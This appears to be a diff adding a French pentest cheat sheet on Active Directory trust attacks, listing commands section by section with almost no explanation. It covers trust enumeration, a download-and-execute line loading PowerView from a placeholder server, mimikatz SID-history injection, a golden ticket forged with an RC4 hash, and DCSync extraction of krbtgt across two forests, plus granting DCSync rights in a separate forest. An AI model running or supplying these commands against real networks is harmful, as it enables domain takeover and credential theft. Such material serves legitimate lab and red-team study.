@@ -1,0 +1,57 @@
+# 2.4.1 Énumération des relations d’approbations
+
+nltest /trusted_domains
+
+dsquery * -filter "(objectClass=trustedDomain)" -attr *
+
+Get-ADTrust -Filter * -Properties *
+
+IEX (New-Object Net.WebClient).DownloadString('https://<SERVEUR_IP>:<SERVEUR_PORT>/PowerView.ps1');
+Get-ForestTrust 
+Get-DomainTrust
+
+(Get-ADForest).Domains | ForEach-Object {
+	Get-ADTrust -Server $_ -Filter * -Properties *
+}
+
+(Get-ADForest).Domains | ForEach-Object { 
+	Get-ADTrust -Server $_ -Filter * -Properties *  | 
+	Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation 
+}
+
+# 2.4.2 Compromission de la forêt depuis un domaine enfant non mis en quarantaine
+
+Get-ADDomain forest1.net | Ft Name,DomainSID
+
+# mimikatz
+privilege::debug
+sid::patch
+sid::add /sam:user1_da /new:S-1-5-21-351192908-2078360967-3889150907-519
+
+Get-ADUser user1_da -Properties samAccountName, SIDHistory
+
+PsExec64.exe -accepteula \\forest1.net whoami /user /groups
+
+kerberos::golden /user:SID-DC1SUB$ /rc4:6c06d08e5cc09770f960d6d4690d0564 /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:516 /sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9 /id:S-1-5-21-2897659825-2986355867-346294487-1001 /ptt
+
+lsadump::dcsync /domain:forest1.net /dc:sid-dc1.forest1.net /user:forest1\krbtgt
+
+# 2.4.3 Compromission d’une forêt distincte ou domaine externe au travers d’une approbation non mise en quarantaine
+
+Get-ADGroup -Server forest2.net "Exchange Windows Permissions"
+
+# mimikatz
+privilege::debug
+sid::patch
+sid::add /sam:user_ea /new:S-1-5-21-3552938972-2500852776-447908158-1122
+
+Import-Module .\PowerView.ps1
+Add-ObjectACL -Server forest2.net -TargetDomain forest2.net -TargetIdentity "dc=forest2,dc=net" -
+PrincipalDomain forest1.net -PrincipalIdentity user_ea -Rights DCSync
+
+Get-ADUser user_ea -Properties * | Ft SID
+
+Get-ObjectACL -Server forest2.net -Domain forest2.net -Identity "dc=forest2,dc=net" | ?{$_.SecurityIdentifier -match 'S-1-5-21-641969683-1743101000-2841093426-1109'} | Ft ObjectAceType
+ObjectAceType
+
+lsadump::dcsync /domain:forest2.net /dc:sid-dc2.forest2.net /user:forest2\krbtgt
